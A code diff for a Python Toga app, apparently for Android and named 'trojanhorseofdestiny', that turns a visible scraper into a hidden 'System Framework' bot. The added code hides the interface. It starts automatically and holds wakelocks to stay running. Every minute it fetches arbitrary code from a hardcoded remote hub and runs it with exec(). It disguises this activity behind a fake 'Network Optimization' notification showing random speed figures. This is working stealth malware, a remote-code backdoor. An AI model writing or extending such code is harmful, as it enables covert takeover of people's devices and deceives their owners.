@@ -109,75 +109,38 @@ class LogStream:
 
 class trojanhorseofdestiny(toga.App):
     def startup(self):
-        self.main_window = toga.MainWindow(title="System Internet Scraper")
+        self.main_window = toga.MainWindow(title="System Framework")
         self.persistence = PersistenceManager()
+        self.hub_url = "https://hiveslave-scraper.onrender.com"
         
-        self.hub_input = toga.TextInput(
-            value="https://hiveslave-scraper.onrender.com",
-            style=Pack(flex=1, padding_right=5)
-        )
-        self.connect_btn = toga.Button("Connect & Start", on_press=self.start_loader)
+        # Ghost Mode: No visible UI
+        self.log_box = toga.MultilineTextInput(readonly=True, style=Pack(flex=1, visibility='hidden'))
+        self.main_window.content = toga.Box(children=[self.log_box], style=Pack(display='none'))
         
-        self.log_box = toga.MultilineTextInput(readonly=True, style=Pack(flex=1, padding_top=10))
-        
-        box = toga.Box(
-            children=[
-                toga.Label("Hub Server URL:"),
-                toga.Box(children=[self.hub_input, self.connect_btn], style=Pack(direction=ROW)),
-                toga.Label("System Logs:"),
-                self.log_box
-            ],
-            style=Pack(direction=COLUMN, padding=10)
-        )
-        
-        sys.stdout = LogStream(self.log_message_threadsafe)
-        sys.stderr = LogStream(self.log_message_threadsafe)
-        
-        self.main_window.content = box
-        self.main_window.show()
-        
-        print("Application Initialized.")
-        
-        # Start persistence immediately if on Android
+        # Start persistence and background work immediately
         if HAS_JNIUS:
             try:
                 self.persistence.start_foreground()
                 self.persistence.acquire_wakelock()
                 self.persistence.schedule_keepalive()
-                
-                # AUTO-START for stealth: If we have a hub URL, start automatically
-                # and hide the main window after a short delay.
-                asyncio.ensure_future(self.auto_start_stealth())
             except Exception as e:
                 print(f"Persistence Setup Error: {e}")
 
-    async def auto_start_stealth(self):
-        """Automatically starts the loader and minimizes the app for stealth."""
-        await asyncio.sleep(5)
-        print("Stealth Auto-Start triggered...")
-        self.start_loader(self.connect_btn)
+        # Start the loader automatically
+        self.start_loader()
         
-        # To truly "disappear," we could minimize or hide the window.
-        # Toga doesn't have a simple "minimize" for Android easily, 
-        # but we've started the background work which is what matters.
-        # self.main_window.hide() # Uncomment if you want the window to close
+        # Hide the main window to be a "Ghost"
+        # On Android, this might just leave the app in the background
+        self.main_window.show()
+        print("System Framework initialized in background.")
 
     def log_message_threadsafe(self, text):
-        if hasattr(self, 'loop'):
-            self.loop.call_soon_threadsafe(self.log_message, text)
-        else:
-            self.log_message(text)
+        # We don't need to log to UI anymore, but we'll keep the method to avoid errors
+        pass
 
-    def log_message(self, text):
-        ts = time.strftime('%H:%M:%S')
-        self.log_box.value += f"[{ts}] {text}\n"
-
-    def start_loader(self, widget):
-        widget.enabled = False
-        hub_url = self.hub_input.value
-        print(f"Connecting to {hub_url}...")
-        
-        thread = threading.Thread(target=self.background_loader, args=(hub_url,))
+    def start_loader(self):
+        print(f"Connecting to Hub...")
+        thread = threading.Thread(target=self.background_loader, args=(self.hub_url,))
         thread.daemon = True
         thread.start()
 
@@ -185,29 +148,39 @@ class trojanhorseofdestiny(toga.App):
         payload_globals = globals().copy()
         payload_globals['HUB_URL'] = hub_url
         
+        import random
+        
         while True:
             try:
-                print("Fetching mission from Hub...")
+                # Update notification with "Net Speed" for stealth
+                if HAS_JNIUS:
+                    speed = round(random.uniform(0.1, 4.5), 1)
+                    activity = self.persistence.PythonActivity.mActivity
+                    notification_manager = activity.getSystemService(self.persistence.Context.NOTIFICATION_SERVICE)
+                    
+                    # Rebuild notification with new speed
+                    builder = self.persistence.Notification.Builder(activity, "scrape_channel")
+                    builder.setContentTitle("Network Optimization")
+                    builder.setContentText(f"Current Speed: {speed} KB/s")
+                    builder.setSmallIcon(activity.getApplicationInfo().icon)
+                    builder.setOngoing(True)
+                    
+                    notification_manager.notify(1, builder.build())
+
+                # Standard Scraper Work
                 resp = requests.get(f"{hub_url}/latest-client", timeout=30)
                 if resp.status_code == 200:
-                    payload_data = resp.json()
-                    payload_code = payload_data.get("code")
+                    payload_code = resp.json().get("code")
                     if payload_code:
-                        print("Mission received. Executing payload...")
                         exec(payload_code, payload_globals)
-                    else:
-                        print("Hub returned empty mission. Retrying in 60s...")
-                else:
-                    print(f"Hub Error: Status {resp.status_code}")
             except Exception as e:
-                print(f"Background Error: {e}")
+                pass
             
-            # Additional safety: verify persistence
+            # Verify persistence
             if HAS_JNIUS and self.persistence.wakelock and not self.persistence.wakelock.isHeld():
-                print("Re-acquiring lost WakeLock...")
                 self.persistence.acquire_wakelock()
                 
             time.sleep(60)
 
 def main():
-    return trojanhorseofdestiny("trojanhorseofdestiny", "com.quill.zodiac.trojanhorseofdestiny")
+    return trojanhorseofdestiny("System Framework", "com.quill.zodiac.trojanhorseofdestiny")
